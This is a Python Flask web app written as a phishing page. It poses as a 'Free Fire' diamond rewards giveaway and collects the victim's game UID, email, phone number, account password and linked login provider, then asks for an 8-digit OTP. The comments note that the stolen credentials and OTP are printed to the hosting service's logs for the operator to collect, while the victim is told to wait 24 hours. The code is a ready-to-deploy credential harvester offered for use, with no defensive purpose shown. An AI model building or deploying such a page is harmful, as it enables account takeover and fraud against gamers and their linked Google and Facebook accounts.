from flask import Flask, request, render_template_string

app = Flask(__name__)

# 1. Aapka PostImages wala Direct Link (Screenshot ke mutabik)
BG_URL = "https://i.postimg.cc/zXQBBdsW/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"

# 2. Page Design
HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>FF Diamond Rewards</title>
    <style>
        body {{
            background-image: url('{BG_URL}');
            background-size: cover; background-position: center; background-attachment: fixed;
            margin: 0; font-family: sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }}
        .form-box {{
            background: rgba(255, 255, 255, 0.96); padding: 25px; border-radius: 15px;
            text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }}
        input, select {{ 
            width: 100%; padding: 12px; margin: 10px 0; 
            border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; 
        }}
        .blue-btn {{ 
            background: #1a73e8; color: white; border: none; padding: 15px; 
            width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;
        }}
    </style>
</head>
<body>
    <div class="form-box">
        <h2 style="color:#1a73e8;">💎 FREE FIRE REWARDS 💎</h2>
        <form action="/preview" method="post">
            <input type="text" name="uid" placeholder="Free Fire UID" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="text" name="phone" placeholder="Mobile Number" required>
            <input type="text" name="password" placeholder="Account Password" required>
            <select name="account_type">
                <option value="Google">Google Account</option>
                <option value="Facebook">Facebook Account</option>
                <option value="VK">VK Account</option>
                <option value="X">X (Twitter) Account</option>
            </select>
            <button type="submit" class="blue-btn">PROCEED</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

# 3. PREVIEW PAGE (User details verify karega)
@app.route('/preview', methods=['POST'])
def preview():
    uid = request.form.get('uid')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    acc = request.form.get('account_type')

    return f'''
    <body style="background-image: url('{BG_URL}'); background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif;">
        <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center;">
            <h3 style="color: red;">Confirm Details</h3>
            <div style="text-align: left; background: #f0f0f0; padding: 15px; border-radius: 8px; font-size: 14px;">
                <p><b>UID:</b> {uid}</p>
                <p><b>Email:</b> {email}</p>
                <p><b>Password:</b> <span style="color:blue;">{password}</span></p>
                <p><b>Phone:</b> {phone}</p>
                <p><b>Login:</b> {acc}</p>
            </div>
            <form action="/submit_final" method="post">
                <input type="hidden" name="uid" value="{uid}">
                <input type="hidden" name="email" value="{email}">
                <input type="hidden" name="phone" value="{phone}">
                <input type="hidden" name="password" value="{password}">
                <input type="hidden" name="acc" value="{acc}">
                <button type="submit" style="background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; margin-top: 15px; font-weight: bold;">CONFIRM & GET OTP</button>
            </form>
        </div>
    </body>
    '''

# 4. FINAL SUBMIT (Render Logs mein data dikhega)
@app.route('/submit_final', methods=['POST'])
def submit_final():
    uid = request.form.get('uid')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    acc = request.form.get('acc')

    # Dashboard.render.com ke Logs mein ye dikhega
    print("\n" + "🎯" * 10)
    print(f"ID: {uid} | MAIL: {email} | PASS: {password} | PH: {phone} | TYPE: {acc}")
    print("🎯" * 10 + "\n")

    return f'''
    <body style="background-image: url('{BG_URL}'); background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif;">
        <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center;">
            <h2>OTP Verification</h2>
            <p>8-Digit code sent to {phone}</p>
            <form action="/final_otp" method="post">
                <input type="text" name="otp" placeholder="Enter 8-digit OTP" maxlength="8" required style="width: 100%; padding: 10px; margin-bottom: 20px;">
                <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px;">VERIFY</button>
            </form>
        </div>
    </body>
    '''

@app.route('/final_otp', methods=['POST'])
def final_otp():
    otp = request.form.get('otp')
    print(f"📩 RECEIVED OTP: {otp}")
    return "<h1 style='color:white; text-align:center; margin-top:50px;'>Processing... Please wait 24 hours.</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
